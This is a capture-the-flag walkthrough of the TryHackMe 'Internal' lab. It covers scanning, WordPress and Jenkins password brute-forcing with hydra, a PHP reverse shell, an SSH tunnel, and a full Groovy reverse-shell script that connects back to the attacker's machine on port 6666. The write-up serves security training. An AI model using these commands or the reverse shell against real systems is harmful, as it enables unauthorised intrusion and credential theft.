---
title: Internal
date: 2022-06-26 18:32:00 -0500
categories: [Tryhackme, Walkthrough]
tags: [jenkins]
---


---

title: Box - Internal
published: true
---

Penetration Testing Challenge

[https://tryhackme.com/room/internal](https://tryhackme.com/room/internal)

![0xskar](/assets/hacker-900-350.jpg)

* * *

## Task 1 - Pre-Engagement Briefing 

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks. 

Scope of Work

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

   - User.txt
   - Root.txt

Additionally, the client has provided the following scope allowances:

   - Ensure that you modify your hosts file to reflect internal.thm
   - Any tools or techniques are permitted in this engagement
   - Locate and note all vulnerabilities found
   - Submit the flags discovered to the dashboard
   - Only the IP address assigned to your machine is in scope

## # NMap Scans

1. ``sudo nmap -Pn -sS -T4 -p- 10.10.224.66 -vvv``
- Found two ports
- 22/tcp open|filtered ssh
- 80/tcp open|filtered http

2. ``sudo nmap -Pn -sV -sC -O -T4 -p22,80 10.10.224.66 -vvv``

```shell
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

## # Port 22 SSH Audit

1. ``python3 ~/scripts/ssh-audit-2.5.0/ssh-audit.py -p 22 10.10.224.66`` finds us:

```shell
security
(cve) CVE-2018-15473 -- (CVSSv2: 5.3) enumerate usernames due to timing discrepencies

fingerprints
(fin) ssh-ed25519: SHA256:seRYczfyDrkweytt6CJT/aBCJZMIcvlYYrTgoGxeHs4
(fin) ssh-rsa: SHA256:LLo2z4GtCCjYQ+qvcJ2OuH4jVMdsvnQVuWekzUWnfq4
```

2. ``ssh-keyscan -t rsa 10.10.224.66 -p 22``   

```shell
10.10.224.66:22 SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
10.10.224.66 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzpZTvmUlaHPpKH8X2SHMndoS+GsVlbhABHJt4TN/nKUSYeFEHbNzutQnj+DrUEwNMauqaWCY7vNeYguQUXLx4LM5ukMEC8IuJo0rcuKNmlyYrgBlFws3q2956v8urY7/McCFf5IsItQxurCDyfyU/erO7fO02n2iT5k7Bw2UWf8FPvM9/jahisbkA9/FQKou3mbaSANb5nSrPc7p9FbqKs1vGpFopdUTI2dl4OQ3TkQWNXpvaFl0j1ilRynu5zLr6FetD5WWZXAuCNHNmcRo/aPdoX9JXaPKGCcVywqMM/Qy+gSiiIKvmavX6rYlnRFWEp25EifIPuHQ0s8hSXqx5
```

## # Port 80 Web Pentest

- Main internal.thm gives us an Apache2 Ubuntu Default Page
- WPScan gives us Server: Apache/2.4.29 (Ubuntu)
- WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).

1. Gobuster ``gobuster dir -u http://internal.thm -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -e`` 

```shell
http://internal.thm/wordpress       (Status: 301) [Size: 316] [--> http://internal.thm/wordpress/]
http://internal.thm/javascript      (Status: 301) [Size: 317] [--> http://internal.thm/javascript/]
http://internal.thm/blog            (Status: 301) [Size: 311] [--> http://internal.thm/blog/]      
http://internal.thm/phpmyadmin      (Status: 301) [Size: 317] [--> http://internal.thm/phpmyadmin/]
http://internal.thm/server-status   (Status: 403) [Size: 277]                                      
```                                                                       

2. Since we can see a wordpress site we can run wpscan and enumerate. ``wpscan --url http://internal.thm/wordpress/ -v -e vp`` and we get 12 vulnerabilities:  
    - WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
    - WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
    - WordPress 5.4 to 5.8 -  Lodash Library Update
    - WordPress 5.4 to 5.8 - Authenticated XSS in Block Editor
    - WordPress 5.4 to 5.8 - Data Exposure via REST API
    - WordPress < 5.8.2 - Expired DST Root CA X3 Certificate
    - WordPress < 5.8 - Plugin Confusion
    - WordPress < 5.8.3 - SQL Injection via WP_Query
    - WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
    - WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
    - WordPress < 5.8.3 - Super Admin Object Injection in Multisites
    - WordPress < 5.9.2 - Prototype Pollution in jQuery


[+] XML-RPC seems to be enabled: http://internal.thm/wordpress/xmlrpc.php

- Running wpxploit with default wordlist and admin ``./exploit.py http://internal.thm/wordpress/ 5 15`` gives us admin:my2boys for wordpress login.

![0xskar](/assets/internal02.png)

## # Privilege Escalation Vulnerabilities

- Found during linpeas scan Vulnerable to CVE-2021-4034
- Found during ``wpscan`` - Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation | linux/local/46676.php

1. insert php reverse shell into wordpress template editor and open up reverse shell ![0xskar](/assets/internal03.png)

2. browse the machine.

```shell
$ cd opt
$ ls
containerd
wp-save.txt
$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123

l:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```

3. looks like we found Aubreanna's SSH creds, can login with these and get our user.txt flag. Don't leave passwords laying around... and also a Jenkins service? But now we can check privs and try to get root 
- Ubuntu 18.04.4 LTS

4. find SUID bits and we have a few 

```shell
/bin/mount
/bin/umount
/bin/ping
/bin/fusermount
/bin/su
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
/usr/bin/pkexec
```

5. ``uname -a`` gives us kernal information: ``Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux``
6. lets wget and ./linpeas.sh on the machine to see what we missed...

```shell
Exploit: Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (polkit Method)
      URL: https://www.exploit-db.com/exploits/47167
     Path: /usr/share/exploitdb/exploits/linux/local/47167.sh
File Type: POSIX shell script, ASCII text executable
```

7. Can't seem to get that exploit to work - so going back to the "Internal Jenkins service is running on 172.17.0.2:8080". Some googling says that this is an internal Docker Service. INTERNAL! The name of the client this must be our way to root?
8. Because this is an internal IP we need to create an SSH tunnel a to access it from our remote machine. 
- ``ssh aubreanna@10.10.238.97 -N -f -L 2222:172.17.0.2:8080`` -N create non interactive -f request ssh to go to the background -L for local port forward
9. With the SSH tunnel setup we can access the Internal Jenkins at http://localhost:2222
10. build hydra to brute force?
11. ``hydra -t 16 -l admin -P /usr/share/seclists/Passwords/rockyou.txt localhost -s 2222 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password"  ``
12. admin:spongebob
13. traveling to the script console we can abuse this to run commands on the internal jenkins system and get a reverse shell. 

```shell
String host="10.x.x.x";

int port=6666;

String cmd=”bash”;

Process p=new 
ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

14. ``nc -nvlp 6666`` on our kali machine and run the script in the console to get out shell.
15. checking around this machine and checking out /opt/ we can see a note for aubreanna with root ssh credentials. root:tr0ub13guM!@#123

##   Answer the questions below

**User.txt Flag**

![0xskar](/assets/internal04.png)

**Root.txt Flag**

![0xskar](/assets/internal05.png)

* * *



